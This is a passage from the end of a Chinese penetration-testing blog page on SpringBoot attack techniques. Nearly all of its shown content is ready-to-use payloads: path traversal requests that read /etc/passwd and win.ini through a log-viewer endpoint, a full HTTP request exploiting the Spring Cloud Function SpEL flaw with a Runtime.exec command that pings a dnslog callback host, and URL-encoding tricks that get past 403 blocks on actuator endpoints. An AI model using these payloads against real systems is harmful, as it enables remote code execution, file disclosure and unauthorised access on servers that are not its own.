+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">view</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">windows</span><span class="o">/</span><span class="n">win</span><span class="p">.</span><span class="na">ini</span><span class="o">&amp;</span><span class="n">base</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">view</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">windows</span><span class="o">/</span><span class="n">win</span><span class="p">.</span><span class="na">ini</span><span class="o">&amp;</span><span class="n">base</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">view</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">&amp;</span><span class="n">base</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="err">、</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">view</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">&amp;</span><span class="n">base</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="24spring-cloud-function-functionrouter-spel代码执行漏洞">2.4.Spring Cloud Function functionRouter SPEL代码执行漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">functionRouter</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span><span class="w"> </span><span class="n">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">92</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">4515</span><span class="p">.</span><span class="na">159</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">spring</span><span class="p">.</span><span class="na">cloud</span><span class="p">.</span><span class="na">function</span><span class="p">.</span><span class="na">routing</span><span class="o">-</span><span class="n">expression</span><span class="p">:</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;ping ony8ez.dnslog.cn&#34;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/12.png"
+	width="1432"
+	height="351"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/12_hu_c928ac488ef870d7.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/12_hu_5d3e4b17e75b548.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="407"
+		data-flex-basis="979px"
+	
+></p>
+<h2 id="3springboot常见绕过">3.SpringBoot常见绕过
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">;.</span><span class="na">css</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">;.</span><span class="na">js</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">http</span><span class="p">:</span><span class="c1">//xxx:8082/actuator/env;.js</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">http</span><span class="p">:</span><span class="c1">//xxx/actuator/..;/actuator/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//xxxxxx.com.cn:8088/prod-api/actuat%6fr/  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//xxxxxx.com.cn:8088/prod-api/actuat%6fr/env  ------ 成功访问</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//xxxxxx.com.cn:8088/prod-api/actuator/env  ------ 403</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/13.png"
+	width="1727"
+	height="1109"
+	srcset="/p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/13_hu_3a81358acffe46e5.png 480w, /p/springboot%E6%A1%86%E6%9E%B6%E6%89%93%E7%82%B9/image/13_hu_546fcfa69a7d2a82.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="373px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Nov 02, 2025 19:44 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.27158cfa379fb1dc491350e47e9afd94_hu_3cb0bc1e7ba58469.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 帆软常见漏洞"
+                        
+                        data-hash="md5-JxWM&#43;jefsdxJE1Dkfpr9lA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">帆软常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E5%B8%B8%E8%A7%81%E6%89%8B%E6%B3%95/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E5%B8%B8%E8%A7%81%E6%89%8B%E6%B3%95/logo.ed5d5ac2be6853a0ed2459ef709b4cb8_hu_c9c8621ef8c05d8.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 支付漏洞场景常见手法"
+                        
+                        data-hash="md5-7V1awr5oU6DtJFnvcJtMuA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">支付漏洞场景常见手法</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%9D%83%E9%99%90%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%9D%83%E9%99%90%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/logo.cb6a9ffc7f347a938800afb3c6d0f208_hu_4b2a774d265e3eab.jpeg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 权限访问漏洞"
+                        
+                        data-hash="md5-y2qf/H80epOIAK&#43;zxtDyCA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">权限访问漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/logo.93772794f0020cda83bbafb49b908f0f_hu_d87e7bbc8ab51d94.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 微信小程序渗透"
+                        
+                        data-hash="md5-k3cnlPACDNqDu6&#43;0m5CPDw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">微信小程序渗透</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo.dce1f8bfc29060f592c952105592cbed_hu_f196d16a79a46b05.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 云安全渗透测试"
+                        
+                        data-hash="md5-3OH4v8KQYPWSyVIQVZLL7Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">云安全渗透测试</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
